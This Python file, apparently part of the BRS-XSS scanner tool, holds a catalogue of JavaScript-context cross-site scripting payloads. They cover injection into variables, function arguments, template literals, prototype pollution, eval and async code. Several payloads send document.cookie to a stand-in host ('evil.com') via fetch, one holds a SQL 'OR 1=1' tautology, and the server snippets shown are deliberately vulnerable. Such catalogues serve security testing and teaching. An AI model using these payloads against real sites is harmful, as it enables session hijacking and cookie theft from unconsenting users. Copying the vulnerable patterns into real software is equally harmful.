#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

JavaScript Context - Basic Attack Vectors
"""

BASIC_ATTACKS = """
DIRECT CODE INJECTION:

1. BASIC INJECTION:
   Server code:
   <script>
   var data = <?php echo $user_input ?>;
   </script>
   
   Payload:
   1; alert(document.cookie); var x = 1
   
   Result:
   <script>
   var data = 1; alert(document.cookie); var x = 1;
   </script>

2. VARIABLE ASSIGNMENT:
   <script>var userId = USER_INPUT;</script>
   
   Payloads:
   null; alert(1); var x=
   123; fetch('//evil.com?c='+document.cookie); var x=
   null}catch(e){alert(1)}try{var x=

3. FUNCTION ARGUMENTS:
   <script>doSomething(USER_INPUT);</script>
   
   Payloads:
   1); alert(1); doSomething(1
   null); fetch('//evil.com?c='+btoa(document.cookie)); doSomething(null
   1, alert(1), 1

4. OBJECT PROPERTIES:
   <script>var config = {value: USER_INPUT};</script>
   
   Payloads:
   1, exploit: alert(1), real: 1
   null}; alert(1); var config = {value: null
   1}};alert(1);var config = {value:1

ES6 TEMPLATE LITERAL EXPLOITATION:

5. TEMPLATE STRINGS:
   <script>var message = `Hello USER_INPUT`;</script>
   
   Payload:
   ${alert(1)}
   ${fetch('//evil.com?c='+document.cookie)}
   ${constructor.constructor('alert(1)')()}
   
   Result:
   <script>var message = `Hello ${alert(1)}`;</script>

6. TAGGED TEMPLATES:
   <script>sql`SELECT * FROM users WHERE id = ${USER_INPUT}`;</script>
   
   Payload:
   1}; alert(1); var x = ${1
   1} OR 1=1 --

7. NESTED TEMPLATES:
   <script>var x = `Outer ${`Inner ${USER_INPUT}`}`;</script>
   
   Payload:
   ${alert(1)}
   `+alert(1)+`

PROTOTYPE POLLUTION:

8. __PROTO__ INJECTION:
   <script>var config = {USER_KEY: USER_VALUE};</script>
   
   If USER_KEY can be controlled:
   __proto__: {polluted: true}
   constructor: {prototype: {polluted: true}}
   
   Leading to XSS via:
   Object.prototype.polluted = '<img src=x onerror=alert(1)>';

9. CONSTRUCTOR POLLUTION:
   <script>merge(defaultConfig, {USER_INPUT});</script>
   
   Payload:
   "constructor": {"prototype": {"isAdmin": true}}

ARRAY/OBJECT CONTEXT BREAKOUTS:

10. ARRAY INJECTION:
    <script>var items = [USER_INPUT];</script>
    
    Payloads:
    1]; alert(1); var items = [1
    null]; fetch('//evil.com'); var x = [null
    1, alert(1), 1

11. NESTED OBJECTS:
    <script>var data = {user: {name: USER_INPUT}};</script>
    
    Payloads:
    null}}, exploit: alert(1), nested: {name: null
    "test"}}; alert(1); var data = {user: {name: "test"

12. BREAKING OUT WITH PUNCTUATION:
    }, alert(1), {x:1
    }], alert(1), [{x:1
    })}, alert(1), {x:({

FUNCTION CONSTRUCTOR ABUSE:

13. eval() INJECTION:
    <script>eval('var x = ' + USER_INPUT);</script>
    
    Payload:
    1; alert(1); var y=1
    
    Direct execution - extremely dangerous

14. Function() CONSTRUCTOR:
    <script>var fn = new Function('return ' + USER_INPUT);</script>
    
    Payload:
    1; alert(1); return 1
    alert(1)

15. setTimeout/setInterval STRINGS:
    <script>setTimeout('doSomething(' + USER_INPUT + ')', 1000);</script>
    
    Payload:
    1); alert(1); doSomething(1

ASYNC/AWAIT AND PROMISES:

16. PROMISE CHAINS:
    <script>
    Promise.resolve(USER_INPUT).then(data => console.log(data));
    </script>
    
    Payload:
    null); alert(1); Promise.resolve(null

17. ASYNC FUNCTIONS:
    <script>
    async function process() {
        var result = USER_INPUT;
    }
    </script>
    
    Payload:
    await fetch('//evil.com?c='+document.cookie); var result = null

18. GENERATORS:
    <script>
    function* gen() {
        yield USER_INPUT;
    }
    </script>
    
    Payload:
    alert(1); yield null
"""

